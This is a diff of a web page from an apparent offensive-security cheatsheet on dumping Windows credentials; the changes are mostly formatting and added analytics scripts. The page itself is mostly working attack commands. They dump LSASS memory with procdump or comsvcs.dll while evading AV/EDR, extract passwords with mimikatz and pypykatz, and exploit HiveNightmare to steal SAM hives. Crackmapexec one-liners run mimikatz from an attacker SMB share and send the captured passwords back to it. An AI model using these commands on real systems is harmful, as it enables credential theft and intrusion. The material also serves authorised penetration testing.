@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>LSASS, Mimikatz, SAM :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1833,9 +1862,7 @@
     
     
     
-    
-
-<h3 id="lsass">LSASS</h3>
+    <h3 id="lsass">LSASS</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Avoiding running Mimikatz on the target can be a nice solution for stealth</span>
 <span style="color:#75715e"># You can just dump the LSASS process, get them and parse it locally</span>
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -1847,16 +1874,17 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 <span style="color:#75715e"># You can use the cmsvcs.dll DLL in order the dump LSASS (https://beta.hackndo.com/remote-lsass-dump-passwords/)</span>
 <span style="color:#75715e"># C:\Windows\System32</span>
-rundll32.exe C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>omsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Dumping LSASS using the Windows Error Reporting process</span>
+rundll32.exe C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>omsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full
+
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Dumping LSASS using the Windows Error Reporting process</span>
 https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2
 
 <span style="color:#75715e"># Tool using SilentProcessExit</span>
 https://github.com/deepinstinct/LsassSilentProcessExit
 
 <span style="color:#75715e"># The idea is to use the legit WER functionnality to dump LSASS without crashing it</span>
-<span style="color:#75715e"># And to evade AV/EDR detection</span></code></pre></div>
-<p><br/></p>
-
+<span style="color:#75715e"># And to evade AV/EDR detection</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="mimikatz">Mimikatz</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you have an LSASS dump, you can use the minidump module</span>
 mimikatz <span style="color:#75715e"># sekurlsa::minidump lsass.DMP</span>
@@ -1873,15 +1901,15 @@ winexe -U admin%password //IP C:<span style="color:#8045ff">\\</span>Windows<spa
 
 <span style="color:#75715e"># Password dumping</span>
 mimikatz <span style="color:#75715e"># privilege::debug</span>
-mimikatz <span style="color:#75715e"># sekurlsa::logonPasswords /full</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share</span>
+mimikatz <span style="color:#75715e"># sekurlsa::logonPasswords /full</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share</span>
 sudo python smbserver.py SHARE /home/xxxxx/share_path/
 
 sudo ./venv/bin/crackmapexec smb IP -u <span style="color:#d88200">&#34;xxx&#34;</span> -p <span style="color:#d88200">&#34;xxx&#34;</span> -X <span style="color:#d88200">&#39;\\share_ip\SHARE\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonPasswords /full&#34; exit &gt; \\share_ip\SHARE\mimiout_$env:computername.txt&#39;</span>
 
 <span style="color:#75715e"># In order to be stealthier, you can even do the same for procdump</span>
-sudo ./venv/bin/crackmapexec smb IP -u <span style="color:#d88200">&#34;xxx&#34;</span> -p <span style="color:#d88200">&#34;xxx&#34;</span> -X <span style="color:#d88200">&#39;\\share_ip\SHARE\procdump.exe &#34;TODO&#34;&#39;</span></code></pre></div>
-<p><br/></p>
-
+sudo ./venv/bin/crackmapexec smb IP -u <span style="color:#d88200">&#34;xxx&#34;</span> -p <span style="color:#d88200">&#34;xxx&#34;</span> -X <span style="color:#d88200">&#39;\\share_ip\SHARE\procdump.exe &#34;TODO&#34;&#39;</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="pypykatz">Pypykatz</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/skelsec/pypykatz
 
@@ -1890,7 +1918,8 @@ sudo ./venv/bin/crackmapexec smb IP -u <span style="color:#d88200">&#34;xxx&#34;
 <span style="color:#75715e"># Cross platform (only need python3.6)</span>
 
 <span style="color:#75715e"># Live commands need to be ran on live systems</span>
-<span style="color:#75715e"># Others commands can be used for other purposes</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Get LSASS credentials (+ Kerberos tickets)</span>
+<span style="color:#75715e"># Others commands can be used for other purposes</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Get LSASS credentials (+ Kerberos tickets)</span>
 pypykatz live lsa
 pypykatz live lsa -o &lt;output_dir&gt; -k &lt;kerberos_dir&gt;
 
@@ -1911,7 +1940,8 @@ pypykatz live registry
 pypykatz live users list
 
 <span style="color:#75715e"># Gives back the current user in domain:username:SID format</span>
-pypykatz live users whoami</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Parsr mimidump file</span>
+pypykatz live users whoami
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Parsr mimidump file</span>
 pypykatz lsa minidump &lt;input_file&gt;
 
 <span style="color:#75715e"># List domain users prone to SPNRoast or ASRepRoast</span>
@@ -1919,10 +1949,9 @@ pypykatz ldap TEST/victim/pw:@10.10.10.2 spn
 pypykatz ldap TEST/victim/pw:@10.10.10.2 asrep
 
 <span style="color:#75715e"># Decrypt gpp-pass</span>
-pypykatz gppass &lt;base64_enc_password&gt;</code></pre></div>
-<p><br/></p>
-
-<h3 id="hivenightmare-serioussam-cve-2021-36934">HiveNightmare - SeriousSAM (CVE-2021-36934)</h3>
+pypykatz gppass &lt;base64_enc_password&gt;
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="hivenightmare---serioussam-cve-2021-36934">HiveNightmare - SeriousSAM (CVE-2021-36934)</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Blogpost about the vuln</span>
 <span style="color:#75715e"># Explanations, detection, mitigation included</span>
 https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5
@@ -1940,15 +1969,15 @@ https://github.com/GossiTheDog/HiveNightmare
 .<span style="color:#8045ff">\H</span>iveNightmare.exe <span style="color:#f92672">[</span>max shadow to look at<span style="color:#f92672">]</span>
 
 <span style="color:#75715e"># Then, get creds</span>
-python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL</code></pre></div>
-<p><br/></p>
-
+python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="dumping-sam-in-2022">Dumping SAM in 2022</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://twitter.com/mpgn_x64/status/1545506443696246785
 <span style="color:#75715e"># Tools like chntpw, bkhive, pwdump, samdump2 are not working on latest Windows 10</span>
 
 <span style="color:#75715e"># cd Windows/System32/config</span>
-<span style="color:#75715e"># pypykatz registry --sam SAM SYSTEM</span></code></pre></div>
+<span style="color:#75715e"># pypykatz registry --sam SAM SYSTEM</span>
+</code></pre></div>
 
     
     
